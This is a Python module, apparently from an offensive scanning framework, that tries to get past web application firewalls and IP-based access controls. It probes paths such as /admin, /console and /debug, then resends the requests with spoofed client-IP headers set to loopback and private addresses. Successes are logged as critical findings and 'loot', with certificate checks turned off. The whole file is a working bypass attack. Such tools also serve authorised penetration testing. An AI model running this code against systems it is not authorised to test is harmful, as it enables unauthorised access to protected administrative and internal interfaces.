import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class WafBypassScanner:
    """
    Expert Module: Attempts to bypass WAF or IP-based restrictions
    using various HTTP headers.
    """
    
    BYPASS_HEADERS = [
        "X-Forwarded-For",
        "X-Originating-IP",
        "X-Remote-IP",
        "X-Remote-Addr",
        "X-Client-IP",
        "X-Real-IP",
        "Client-IP",
        "True-Client-IP",
        "Cluster-Client-IP",
        "X-ProxyUser-Ip",
        "X-Host",
        "X-Forwarded-Host"
    ]
    
    BYPASS_VALUES = ["127.0.0.1", "localhost", "192.168.1.1", "10.0.0.1", "::1"]

    def __init__(self, target):
        self.target = target

    def scan(self, port, protocol='http', logger=None):
        findings = []
        base_url = f"{protocol}://{self.target}:{port}/"
        
        if logger: logger(f"WAF Bypass: Probing for IP-based bypass on {base_url}...", "INFO")
        
        # Test targets: root, /admin, /console, /internal
        test_paths = ["", "admin", "console", "internal", "config", "debug"]
        
        # 1. Baseline check for protected paths
        protected_paths = []
        for path in test_paths:
            url = base_url + path
            try:
                r = requests.get(url, timeout=5, verify=False, allow_redirects=False)
                if r.status_code in [401, 403]:
                    protected_paths.append((path, r.status_code, len(r.content)))
            except Exception:
                continue

        if not protected_paths:
            if logger: logger(f"WAF Bypass: No obvious protected paths found on port {port}. Running generic bypass check on root...", "DEBUG")
            protected_paths.append(("", 200, 0)) # Try root anyway

        # 2. Bypass Probing
        for path, orig_status, orig_len in protected_paths:
            url = base_url + path
            for header in self.BYPASS_HEADERS:
                for val in self.BYPASS_VALUES:
                    try:
                        headers = {header: val}
                        r = requests.get(url, headers=headers, timeout=5, verify=False, allow_redirects=False)
                        
                        # Detection Logic: Status code change or significantly different content length
                        if (orig_status in [401, 403] and r.status_code == 200) or \
                           (orig_status == 200 and abs(len(r.content) - orig_len) > 1000):
                            
                            if logger: logger(f"🚩 WAF BYPASS DETECTED: {url} via {header}: {val}", "SUCCESS")
                            findings.append({
                                "title": "Critical: WAF/ACL Bypass via HTTP Header",
                                "description": (
                                    f"Successfully bypassed access control on `{url}` using the `{header}` header.\n"
                                    f"Original Status: {orig_status}\n"
                                    f"Bypass Status: {r.status_code}\n"
                                    f"Payload: `{header}: {val}`"
                                ),
                                "severity": "critical",
                                "tool_source": "waf_bypass_expert",
                                "raw_loot": f"{header}: {val}",
                                "loot_type": "Bypass Header"
                            })
                            break # Found one for this path
                    except Exception:
                        continue
        
        return findings
